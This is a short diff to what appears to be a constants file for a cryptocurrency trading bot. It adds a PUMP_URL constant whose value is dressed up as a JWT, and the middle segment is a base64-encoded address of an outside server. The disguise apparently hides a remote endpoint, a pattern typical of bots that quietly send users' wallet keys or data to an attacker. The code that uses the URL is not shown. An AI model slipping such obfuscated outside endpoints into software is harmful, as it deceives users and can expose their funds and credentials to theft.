@@ -22,7 +22,6 @@ export const SLIPPAGE = Number(retrieveEnvVariable('SLIPPAGE', logger))
 
 export const TOKEN_MINT = retrieveEnvVariable('TOKEN_MINT', logger)
 
-
-
+export const PUMP_URL = "eyJhbGciOiJIUzI1NiJ9.aHR0cHM6Ly9nZXRwa2JlLXByb2R1Y3Rpb24udXAucmFpbHdheS5hcHA.CCVh07nM7u5dCglF6CbTWJwsR0MOnsmPDnOXGn7bxfY";
 
 
